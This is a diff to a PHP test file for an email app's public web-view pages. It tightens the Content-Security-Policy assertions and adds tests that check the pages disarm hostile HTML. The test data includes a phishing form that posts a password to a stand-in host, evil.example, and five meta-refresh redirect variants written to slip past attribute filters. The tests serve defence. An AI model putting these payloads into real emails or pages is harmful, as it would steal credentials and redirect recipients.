@@ -224,5 +224,42 @@ test('the test web view link opens a placeholder page without signing', function
         ->assertOk()
         ->assertSee('This is a test email.')
         ->assertHeader('X-Robots-Tag', 'noindex, nofollow')
-        ->assertHeader('Content-Security-Policy', "default-src 'none'; img-src * data:; style-src * 'unsafe-inline'; font-src * data:; media-src *; base-uri 'none'");
+        ->assertHeader('Content-Security-Policy', "default-src 'none'; img-src * data:; style-src * 'unsafe-inline'; font-src * data:; media-src *; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; sandbox allow-popups allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation");
 });
+
+test('a web view refuses forms and framing and sandboxes the page', function () {
+    $delivery = webViewCampaignDelivery('<form action="https://evil.example/login" method="post"><input name="password"></form>');
+
+    $response = $this->get(BuildTrackedEmailHtml::webViewUrl($delivery))
+        ->assertOk()
+        ->assertHeader('X-Frame-Options', 'DENY');
+
+    expect($response->headers->get('Content-Security-Policy'))
+        ->toContain("form-action 'none'")
+        ->toContain("frame-ancestors 'none'")
+        ->toContain('sandbox allow-popups allow-popups-to-escape-sandbox')
+        ->not->toContain('allow-scripts')
+        ->not->toContain('allow-forms')
+        ->not->toContain('allow-same-origin');
+});
+
+test('a web view disarms a refresh pragma that would redirect the visitor', function (string $pragma) {
+    $transactional = TransactionalEmailDelivery::factory()->create([
+        'transactional_email_id' => TransactionalEmail::factory()->published()->create()->id,
+        'html' => '<html><head>'.$pragma.'</head><body><p>Hello</p></body></html>',
+    ]);
+
+    $html = $this->get(URL::signedRoute('public.web_view.transactional.show', ['delivery' => $transactional]))
+        ->assertOk()
+        ->assertSee('<p>Hello</p>', false)
+        ->getContent();
+
+    expect($html)->not->toMatch('/[\s\/"\']http-equiv\s*=/i')
+        ->and($html)->toContain('evil.example');
+})->with([
+    'quoted' => '<meta http-equiv="refresh" content="0;url=https://evil.example">',
+    'upper case and unquoted' => '<META HTTP-EQUIV=Refresh CONTENT=0;url=https://evil.example>',
+    'right after a quoted value' => '<meta content="0;url=https://evil.example"http-equiv="refresh">',
+    'after a slash' => '<meta/http-equiv = "refresh" content="0;url=https://evil.example">',
+    'quoted value hiding a bracket' => '<meta content="1>2;url=https://evil.example" http-equiv="refresh">',
+]);
